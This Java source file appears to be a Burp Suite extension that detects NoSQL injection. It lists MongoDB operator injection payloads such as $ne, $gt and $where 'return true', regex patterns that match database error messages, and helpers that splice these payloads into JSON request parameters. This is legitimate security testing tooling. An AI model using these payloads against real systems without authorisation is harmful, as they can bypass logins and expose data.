package burp;

import java.util.regex.Pattern;

public class NoSQLiDetector {

    public static final String[][] OPERATOR_PAYLOADS = {
        {"{\"$gt\":\"\"}", "Operator $gt"},
        {"{\"$ne\":\"\"}", "Operator $ne"},
        {"{\"$regex\":\".*\"}", "Operator $regex"},
        {"{\"$exists\":true}", "Operator $exists"},
        {"{\"$where\":\"return true\"}", "Operator $where"},
    };

    private static final Pattern[] ERRORS = {
        ci("MongoError"), ci("MongoServerError"), ci("\\$err"), ci("\"errmsg\"\\s*:"),
        ci("BadValue"), ci("Invalid BSON"), ci("BSONObj"), ci("com\\.mongodb"),
        ci("MongoException"), ci("command failed.*?errmsg"),
        ci("ReferenceError.*?(Mongo|BSON|query)"),
        ci("SyntaxError.*?(BSON|Mongo|aggregation|pipeline|operator)"),
        ci("CouchDB"), ci("com\\.couchbase"), ci("org\\.elasticsearch"),
        ci("QueryParsingException"), ci("SearchParseException"),
        ci("CassandraException"), ci("InvalidQueryException"),
        ci("SyntaxException.*?CQL"), ci("com\\.datastax"),
        ci("redis\\.clients\\.jedis"), ci("WRONGTYPE Operation"),
    };

    public static String detectError(String body) {
        for (Pattern p : ERRORS) if (p.matcher(body).find()) return p.pattern();
        return null;
    }

    public static String buildOperatorPayload(String json, String param, String op) {
        String pat = "\"" + esc(param) + "\"\\s*:\\s*\"[^\"]*\"";
        return json.replaceFirst(pat, "\"" + param + "\":" + op);
    }

    public static String buildOperatorPayloadNumeric(String json, String param, String op) {
        String pat = "\"" + esc(param) + "\"\\s*:\\s*-?\\d+(\\.\\d+)?";
        return json.replaceFirst(pat, "\"" + param + "\":" + op);
    }

    private static String esc(String s) { return s.replaceAll("([\\\\\\[\\](){}.*+?^$|])", "\\\\$1"); }
    private static Pattern ci(String r) { return Pattern.compile(r, Pattern.CASE_INSENSITIVE); }
}
